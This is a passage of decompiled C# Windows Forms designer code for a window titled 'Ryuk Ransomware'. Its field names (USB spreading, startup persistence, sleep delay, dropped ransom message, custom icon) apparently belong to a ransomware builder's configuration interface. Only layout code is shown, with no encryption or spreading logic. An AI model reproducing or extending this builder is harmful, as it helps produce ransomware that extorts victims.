			this.RightBottomPanel_2.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.RightBottomPanel_2_MouseMove);
			this.RightBottomPanel_2.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.RightBottomPanel_2_MouseUp);
			this.LeftBottomPanel_2.Anchor = (global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left);
			this.LeftBottomPanel_2.BackColor = global::System.Drawing.Color.Black;
			this.LeftBottomPanel_2.Cursor = global::System.Windows.Forms.Cursors.SizeNESW;
			this.LeftBottomPanel_2.Location = new global::System.Drawing.Point(0, 491);
			this.LeftBottomPanel_2.Name = "LeftBottomPanel_2";
			this.LeftBottomPanel_2.Size = new global::System.Drawing.Size(2, 19);
			this.LeftBottomPanel_2.TabIndex = 11;
			this.LeftBottomPanel_2.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.LeftBottomPanel_2_MouseDown);
			this.LeftBottomPanel_2.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.LeftBottomPanel_2_MouseMove);
			this.LeftBottomPanel_2.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.LeftBottomPanel_2_MouseUp);
			this.RightTopPanel_1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.RightTopPanel_1.BackColor = global::System.Drawing.Color.Black;
			this.RightTopPanel_1.Cursor = global::System.Windows.Forms.Cursors.SizeNESW;
			this.RightTopPanel_1.Location = new global::System.Drawing.Point(896, 2);
			this.RightTopPanel_1.Name = "RightTopPanel_1";
			this.RightTopPanel_1.Size = new global::System.Drawing.Size(2, 20);
			this.RightTopPanel_1.TabIndex = 12;
			this.RightTopPanel_1.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.RightTopPanel_1_MouseDown);
			this.RightTopPanel_1.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.RightTopPanel_1_MouseMove);
			this.RightTopPanel_1.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.RightTopPanel_1_MouseUp);
			this.RightTopPanel_2.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.RightTopPanel_2.BackColor = global::System.Drawing.Color.Black;
			this.RightTopPanel_2.Cursor = global::System.Windows.Forms.Cursors.SizeNESW;
			this.RightTopPanel_2.Location = new global::System.Drawing.Point(878, 0);
			this.RightTopPanel_2.Name = "RightTopPanel_2";
			this.RightTopPanel_2.Size = new global::System.Drawing.Size(20, 2);
			this.RightTopPanel_2.TabIndex = 13;
			this.RightTopPanel_2.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.RightTopPanel_2_MouseDown);
			this.RightTopPanel_2.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.RightTopPanel_2_MouseMove);
			this.RightTopPanel_2.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.RightTopPanel_2_MouseUp);
			this.textBox1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
			this.textBox1.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.textBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.textBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.textBox1.ForeColor = global::System.Drawing.SystemColors.Window;
			this.textBox1.Location = new global::System.Drawing.Point(12, 80);
			this.textBox1.Multiline = true;
			this.textBox1.Name = "textBox1";
			this.textBox1.ScrollBars = global::System.Windows.Forms.ScrollBars.Vertical;
			this.textBox1.Size = new global::System.Drawing.Size(833, 312);
			this.textBox1.TabIndex = 18;
			this.textBox1.Text = componentResourceManager.GetString("textBox1.Text");
			this.textBox1.MouseClick += new global::System.Windows.Forms.MouseEventHandler(this.textBox1_MouseClick);
			this.textBox1.TextChanged += new global::System.EventHandler(this.textBox1_TextChanged);
			this.saveFileDialog1.FileOk += new global::System.ComponentModel.CancelEventHandler(this.saveFileDialog1_FileOk);
			this.openFileDialog1.FileName = "openFileDialog1";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.AutoScroll = true;
			this.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			base.ClientSize = new global::System.Drawing.Size(847, 544);
			base.Controls.Add(this.textBox1);
			base.Controls.Add(this.RightTopPanel_2);
			base.Controls.Add(this.RightTopPanel_1);
			base.Controls.Add(this.LeftBottomPanel_2);
			base.Controls.Add(this.RightBottomPanel_2);
			base.Controls.Add(this.RightBottomPanel_1);
			base.Controls.Add(this.RightPanel);
			base.Controls.Add(this.TopPanel);
			base.Controls.Add(this.panel2);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.MinimumSize = new global::System.Drawing.Size(847, 544);
			base.Name = "BlackForm";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Ryuk Ransomware";
			base.Load += new global::System.EventHandler(this.BlackForm_Load);
			this.TopPanel.ResumeLayout(false);
			this.TopPanel.PerformLayout();
			this.panel2.ResumeLayout(false);
			this.panel2.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000027 RID: 39
		private global::System.ComponentModel.IContainer components = null;

		// Token: 0x04000028 RID: 40
		private global::System.Windows.Forms.Panel RightPanel;

		// Token: 0x04000029 RID: 41
		private global::System.Windows.Forms.Panel TopPanel;

		// Token: 0x0400002A RID: 42
		private global::CustomWindowsForm.ButtonZ _CloseButton;

		// Token: 0x0400002B RID: 43
		private global::System.Windows.Forms.Panel RightBottomPanel_1;

		// Token: 0x0400002C RID: 44
		private global::System.Windows.Forms.Label WindowTextLabel;

		// Token: 0x0400002D RID: 45
		private global::CustomWindowsForm.MinMaxButton _MaxButton;

		// Token: 0x0400002E RID: 46
		private global::System.Windows.Forms.Panel panel2;

		// Token: 0x0400002F RID: 47
		private global::CustomWindowsForm.ButtonZ _MinButton;

		// Token: 0x04000030 RID: 48
		private global::System.Windows.Forms.Panel RightBottomPanel_2;

		// Token: 0x04000031 RID: 49
		private global::System.Windows.Forms.Panel LeftBottomPanel_2;

		// Token: 0x04000032 RID: 50
		private global::System.Windows.Forms.Panel RightTopPanel_1;

		// Token: 0x04000033 RID: 51
		private global::System.Windows.Forms.Panel RightTopPanel_2;

		// Token: 0x04000034 RID: 52
		private global::CustomWindowsForm.ShapedButton shapedButton4;

		// Token: 0x04000035 RID: 53
		private global::System.Windows.Forms.CheckBox usbSpreadCheckBox;

		// Token: 0x04000036 RID: 54
		private global::System.Windows.Forms.TextBox textBox1;

		// Token: 0x04000037 RID: 55
		private global::CustomWindowsForm.ShapedButton shapedButton3;

		// Token: 0x04000038 RID: 56
		private global::System.Windows.Forms.SaveFileDialog saveFileDialog1;

		// Token: 0x04000039 RID: 57
		private global::System.Windows.Forms.CheckBox checkBox1;

		// Token: 0x0400003A RID: 58
		private global::System.Windows.Forms.TextBox textBox2;

		// Token: 0x0400003B RID: 59
		private global::System.Windows.Forms.TextBox spreadNameText;

		// Token: 0x0400003C RID: 60
		private global::System.Windows.Forms.CheckBox checkBox2;

		// Token: 0x0400003D RID: 61
		private global::System.Windows.Forms.TextBox textBox4;

		// Token: 0x0400003E RID: 62
		private global::System.Windows.Forms.CheckBox startupcheckBox3;

		// Token: 0x0400003F RID: 63
		private global::System.Windows.Forms.OpenFileDialog openFileDialog1;

		// Token: 0x04000040 RID: 64
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x04000041 RID: 65
		private global::System.Windows.Forms.Label selectIconLabel;

		// Token: 0x04000042 RID: 66
		private global::System.Windows.Forms.CheckBox sleepCheckBox;

		// Token: 0x04000043 RID: 67
		private global::System.Windows.Forms.TextBox SleepTextBox;

		// Token: 0x04000044 RID: 68
		private global::CustomWindowsForm.ShapedButton shapedButton1;

		// Token: 0x04000045 RID: 69
		private global::System.Windows.Forms.TextBox droppedMessageTextbox;

		// Token: 0x04000046 RID: 70
		private global::System.Windows.Forms.Label label1;

		// Token: 0x04000047 RID: 71
		private global::CustomWindowsForm.ShapedButton shapedButton2;
	}
}
